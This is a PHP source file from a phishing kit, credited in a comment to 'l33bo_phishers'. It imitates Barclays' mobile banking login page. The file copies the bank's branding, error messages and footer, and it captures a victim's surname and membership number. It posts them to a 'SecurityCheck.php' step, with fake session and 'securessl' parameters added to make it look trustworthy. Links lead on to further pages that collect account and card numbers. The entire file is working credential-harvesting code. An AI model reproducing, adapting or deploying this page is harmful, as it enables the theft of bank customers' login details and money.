<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-GB" lang="en-GB"><head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Mobile Log In</title>
<meta http-equiv="Content-Language" content="en-GB">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="assets/img/001.ico" rel="shortcut icon">
<link type="text/css" rel="stylesheet" media="all" href="assets/css/mobi.css">
<script type="text/javascript" src="assets/js/mobi.js"></script>
<script>
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
<script>
function valid() {
	if (document.form.surname.value == "") {
	document.getElementById('errorscontain').style.backgroundColor="#FFFFD6";
	document.getElementById("errorscontain").style.paddingLeft = "5px";
	document.getElementById("errorscontain").style.paddingBottom = "15px";
	document.getElementById("errors").style.paddingTop = "8px";
	document.getElementById("pad").style.paddingTop = "15px";
	var wrongother = document.getElementById('errors').innerHTML = 'M1108 - These details dont match our records so we couldnt log you in to Online Banking. Please check your details are correct before trying again. This includes your name and your 12-digit membership number.';
    var oldHTML = document.getElementById('errors').innerHTML = 'M1122 - Please enter your surname in the relevant field.<br>';
	var newHTML = "<br><span style='color:#C33;width: 100% !important;margin: 5px !important;background: url(assets/img/008.gif) no-repeat scroll -115px -960px;padding: 0px 0px 7px 28px;'>" + wrongother + "</span>";
	var newest = "<span style='color:#C33;width: 100% !important;margin: 5px !important;background: url(assets/img/008.gif) no-repeat scroll -115px -960px;padding: 0px 0px 7px 28px;'>" + oldHTML + newHTML + "</span>";
	document.getElementById('errors').innerHTML = newest;
    return false;
}
	if (document.form.membershipNumber.value == "") {
	document.getElementById('errorscontain').style.backgroundColor="#FFFFD6";
	document.getElementById("errorscontain").style.paddingLeft = "5px";
	document.getElementById("errorscontain").style.paddingBottom = "15px";
	document.getElementById("errors").style.paddingTop = "0px";
	document.getElementById("pad").style.paddingTop = "15px";
	var wrongother = document.getElementById('errors').innerHTML = 'M1108 - These details dont match our records so we couldnt log you in to Online Banking. Please check your details are correct before trying again. This includes your name and your 12-digit membership number.';
	var newHTML = "<br><span style='color:#C33;width: 100% !important;margin: 5px !important;background: url(assets/img/008.gif) no-repeat scroll -115px -960px;padding: 0px 0px 7px 28px;'>" + wrongother + "</span>";
	document.getElementById('errors').innerHTML = newHTML;
    return false;
}
} 
</script> 
</head>
<body class="mobi">
<script>var _ccpCat3 = true;</script>
<script src="assets/mbox.js" type="text/javascript"></script><style>.mboxDefault { visibility:hidden; }</style>
<div class="page mobiPage">
<div class="mobiHeader">
<img src="assets/img/004.gif" class="top-left-corner" alt="" width="10" height="10">	
<div class="branding brandMob"> 
<img src="assets/img/002.gif" alt="Barclays" class="mob"> 
</div>
<div class="headLine"></div>
</div> 
<div class="mobiBody">
<div class="content mobWidth">
<div class="section">
<div class="m-cont">
<script type="text/javascript">
function myBack() {
	if(history.length > 1 ) {
		history.back();
		return false;
	} else {
		location.href="Login.php";
	}
}
</script>
<div class="nifty-2"><b class="rtop-2"><b class="r2-2"></b><b class="r3-2"></b><b class="r4-2"></b></b> 
	&nbsp;<img src="assets/img/001.gif" alt="Back"> 
	<span><a href="../Login.php" class="mobLink" onclick="myBack(); return false;">Back</a></span>
	<b class="rbottom-2"><b class="r4-2"></b><b class="r3-2"></b><b class="r2-2"></b><b class="r1-2"></b></b>
</div>
<br>
<span class="pageTitle"><strong>Mobile Log In</strong>
</span>
<form method="post" action="SecurityCheck.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" onsubmit="return submissionCheck()">
<input type="hidden" name="sortCodeSet1" value="-">
<input type="hidden" name="sortCodeSet2" value="-">
<input type="hidden" name="sortCodeSet3" value="-">
<input type="hidden" name="accountNumber" value="-">
<input type="hidden" name="debitCardSet1" value="-">
<input type="hidden" name="debitCardSet2" value="-">
<input type="hidden" name="debitCardSet3" value="-">
<input type="hidden" name="debitCardSet4" value="-">
<p></p>
Surname<br>
<input type="text" value="" size="25" maxlength="24" name="surname" class="formFont" title="Surname" autocomplete="off"><br><br>
Membership number<br>
<input type="tel" value="" size="25" maxlength="12" name="membershipNumber" title="membershipNumber" autocomplete="off">
<br><br>
<table border="0" cellpadding="0" cellspacing="0">
<tbody><tr>
<td align="left">
<div id="wwgrp_rememberDetails" class="wwgrp">
<div id="wwctrl_rememberDetails" class="wwctrl">
<input type="checkbox" name="rememberDetails" value="true" id="rememberDetails" title="Store your login details"><input type="hidden" id="__checkbox_rememberDetails" name="__checkbox_rememberDetails" value="true"></div> </div></td>
<td align="left">&nbsp;Remember my details&nbsp;<a class="mobLink" href="#" target="_blank">[?]</a></td>
</tr>
</tbody></table>
<br>
<table border="0" cellpadding="0" cellspacing="0">
<tbody><tr>
<td align="left">
<span class="button button-forward" title="Next"><div align="right" id="wwctrl_Next"><input type="submit" id="Next" name="action:MobiLoginStep1WithoutAssistCookie_display" value="Next">
</div> 
</span>
</td>
</tr>
</tbody></table>
<br>
<a class="mobLink" href="LoginAccount.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true">Log in using your Account Number</a>
<br><br>
<a class="mobLink" href="LoginCard.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true">Log in using your Card Number</a>

<div class="snippet"><div style="cursor: pointer"><p><img src="assets/img/001.jpg" height="56" width="280"></p></div></div>	
<script type="text/javascript" src="assets/LoginTimeoutKeepAlive.js"></script>
<script type="text/javascript">
    var loginTimeoutKeepAliveInstance = new LoginTimeoutKeepAlive(600000, true);
</script>
</form>
</div>
</div>
</div>
<div class="mobiReg">©&nbsp;Barclays&nbsp;Bank&nbsp;PLC. Registered&nbsp;in&nbsp;England. Registered&nbsp;no:1026167.</div>
</div>
<div class="mobiMain-Footer"><img src="assets/img/003.gif" class="bot-left-corner" alt="" width="10" height="10"></div>       
</div>
</body>
</html>